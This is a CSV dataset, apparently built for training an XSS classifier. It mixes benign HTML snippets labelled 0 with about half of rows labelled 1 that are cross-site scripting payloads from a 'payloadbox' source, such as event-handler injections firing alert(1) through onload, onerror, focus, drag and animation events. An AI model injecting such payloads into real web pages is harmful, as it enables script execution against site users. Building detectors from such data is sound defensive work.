text,label,source,length,timestamp
"<footer onmouseup=""alert(1)"">test</footer>",1,payloadbox,42,2026-02-09T15:05:27.717767
"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>",1,payloadbox,99,2026-02-09T15:05:27.716766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.740766
"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""?"">",1,payloadbox,61,2026-02-09T15:05:27.725769
<svg><ins onload=alert(1)></ins>,1,payloadbox,32,2026-02-09T15:05:27.723765
"<legend onkeypress=""alert(1)"" contenteditable>test</legend>",1,payloadbox,59,2026-02-09T15:05:27.718768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.731765
<span class='class-1104'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.727768
"<rtc onmouseenter=""alert(1)"">test</rtc>",1,payloadbox,39,2026-02-09T15:05:27.720768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.734777
"<noscript onkeypress=""alert(1)"" contenteditable>test</noscript>",1,payloadbox,63,2026-02-09T15:05:27.719771
"<aside oncopy=""alert(1)"" contenteditable>test</aside>",1,payloadbox,53,2026-02-09T15:05:27.714766
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",1,payloadbox,107,2026-02-09T15:05:27.716766
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",1,payloadbox,57,2026-02-09T15:05:27.714766
"<kbd onkeyup=""alert(1)"" contenteditable>test</kbd>",1,payloadbox,50,2026-02-09T15:05:27.718768
<span class='class-3604'>Services</span>,0,generated,40,2026-02-09T15:05:27.735774
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.740766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.730765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.741766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.743765
<span class='class-5574'>Services</span>,0,generated,40,2026-02-09T15:05:27.741766
<x </onxxx=1,1,payloadbox,12,2026-02-09T15:05:27.713767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.742765
"<u oncontextmenu=""alert(1)"">test</u>",1,payloadbox,36,2026-02-09T15:05:27.723765
"<style>:target {color: red;}</style><sup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sup>",1,payloadbox,109,2026-02-09T15:05:27.721766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.727768
"<div id=""134""><xmp>",1,payloadbox,19,2026-02-09T15:05:27.725769
"<meter oncopy=""alert(1)"" contenteditable>test</meter>",1,payloadbox,53,2026-02-09T15:05:27.719771
"<nobr onpaste=""alert(1)"" contenteditable>test</nobr>",1,payloadbox,52,2026-02-09T15:05:27.719771
<p>About</p>,0,generated,12,2026-02-09T15:05:27.738766
"<figcaption onmousemove=""alert(1)"">test</figcaption>",1,payloadbox,52,2026-02-09T15:05:27.717767
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,1,payloadbox,57,2026-02-09T15:05:27.723765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.726766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.737767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.725769
"<div id=""99"">XXX<style>",1,payloadbox,23,2026-02-09T15:05:27.725769
<svg><tr onload=alert(1)></tr>,1,payloadbox,30,2026-02-09T15:05:27.723765
"<style>:target {color:red;}</style><base id=x style=""transition:color 1s"" ontransitionend=alert(1)></base>",1,payloadbox,106,2026-02-09T15:05:27.721766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.725769
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.732765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.737767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.730765
"<data onmouseout=""alert(1)"">test</data>",1,payloadbox,39,2026-02-09T15:05:27.715767
<image/src/onerror=prompt(8)>,1,payloadbox,29,2026-02-09T15:05:27.713767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.738766
"<video draggable=""true"" ondragenter=""alert(1)"">test</video>",1,payloadbox,59,2026-02-09T15:05:27.724768
"<ins onkeydown=""alert(1)"" contenteditable>test</ins>",1,payloadbox,52,2026-02-09T15:05:27.718768
"<param draggable=""true"" ondragleave=""alert(1)"">test</param>",1,payloadbox,59,2026-02-09T15:05:27.719771
<span class='class-6204'>Services</span>,0,generated,40,2026-02-09T15:05:27.743765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.741766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.728766
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,1,payloadbox,46,2026-02-09T15:05:27.724768
<body onbeforeprint=alert(1)>,1,payloadbox,29,2026-02-09T15:05:27.715767
"<body onmousedown=""alert(1)"">test</body>",1,payloadbox,40,2026-02-09T15:05:27.715767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.737767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.743765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.727768
<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>,1,payloadbox,48,2026-02-09T15:05:27.719771
"<svg><path><animateMotion onrepeat=alert(1) dur=""1s"" repeatCount=""2"">",1,payloadbox,69,2026-02-09T15:05:27.723765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.734777
"<ins onmouseup=""alert(1)"">test</ins>",1,payloadbox,36,2026-02-09T15:05:27.718768
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></strong>",1,payloadbox,182,2026-02-09T15:05:27.722765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.743765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.732765
"<small onbeforecut=""alert(1)"" contenteditable>test</small>",1,payloadbox,58,2026-02-09T15:05:27.720768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.728766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.737767
"<picture><source srcset=""validimage.png""><img onload=alert(1)></picture>",1,payloadbox,72,2026-02-09T15:05:27.719771
<svg onload=alert(1)>,1,payloadbox,21,2026-02-09T15:05:27.722765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.739765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.730765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.743765
"<optgroup draggable=""true"" ondrag=""alert(1)"">test</optgroup>",1,payloadbox,60,2026-02-09T15:05:27.719771
"<img onclick=""alert(1)"">test</img>",1,payloadbox,34,2026-02-09T15:05:27.718768
"<object onbeforecopy=""alert(1)"" contenteditable>test</object>",1,payloadbox,61,2026-02-09T15:05:27.719771
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.729765
<multicol id=x tabindex=1 onfocus=alert(1)></multicol>,1,payloadbox,54,2026-02-09T15:05:27.719771
"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></picture>",1,payloadbox,132,2026-02-09T15:05:27.721766
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></samp>",1,payloadbox,178,2026-02-09T15:05:27.722765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.727768
"<source onbeforepaste=""alert(1)"" contenteditable>test</source>",1,payloadbox,62,2026-02-09T15:05:27.720768
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",1,payloadbox,101,2026-02-09T15:05:27.716766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.731765
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",1,payloadbox,59,2026-02-09T15:05:27.714766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.726766
<img src/onerror=alert(1)>,1,payloadbox,26,2026-02-09T15:05:27.718768
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.735774
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.737767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.731765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.741766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.734777
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.736778
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.740766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.742765
"<style>:target {transform: rotate(180deg);}</style><fieldset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></fieldset>",1,payloadbox,134,2026-02-09T15:05:27.721766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.736778
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.732765
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,1,payloadbox,66,2026-02-09T15:05:27.723765
"<dialog draggable=""true"" ondragstart=""alert(1)"">test</dialog>",1,payloadbox,61,2026-02-09T15:05:27.716766
"<source onmouseleave=""alert(1)"">test</source>",1,payloadbox,45,2026-02-09T15:05:27.720768
<span class='class-514'>Services</span>,0,generated,39,2026-02-09T15:05:27.726766
